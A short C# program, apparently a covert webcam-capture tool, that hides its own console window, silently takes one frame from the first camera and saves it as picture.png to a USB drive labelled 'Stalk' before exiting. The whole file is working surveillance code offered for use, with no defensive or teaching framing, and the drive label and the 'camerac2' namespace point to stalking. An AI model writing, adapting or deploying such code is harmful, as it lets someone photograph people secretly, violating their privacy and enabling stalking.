using System;
using System.Drawing;
using System.Threading;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Linq;
using System.Text;
using System.IO;
using AForge.Imaging.Filters;
using AForge.Imaging;
using AForge.Video;
using AForge.Video.DirectShow;
using System.Runtime.InteropServices;
namespace camerac2
{
    class Program
    {
        static FilterInfoCollection WebcamColl;
        static VideoCaptureDevice Device;

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            Console.WriteLine("Camera is starting up...");
            WebcamColl = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            string name = WebcamColl[0].Name;
            string moniker = WebcamColl[0].MonikerString;
            Console.WriteLine("Avaiable camera: " + name);
            Device = new VideoCaptureDevice(moniker);
            Device.Start();
            Device.NewFrame += new NewFrameEventHandler(Device_NewFrame);

            Thread.Sleep(1000);
            Environment.Exit(0);
        }

        static void Device_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            Console.WriteLine("Webcam image was taken");
            string[] drives = Environment.GetLogicalDrives();
            foreach (string drive in drives)
            {
                try
                {
                    DriveInfo di = new DriveInfo(drive);
                    if (di.VolumeLabel == "Stalk")      //Flash drive name
                    {
                        Bitmap img = (Bitmap)eventArgs.Frame.Clone();
                        img.Save(di.RootDirectory + "picture.png"); //Image name
                        Console.WriteLine("Image saved");
                        //Thread.Sleep(500);
                        Environment.Exit(0);
                    }
                    
                }
                catch
                {}
            }
        }
    }
}
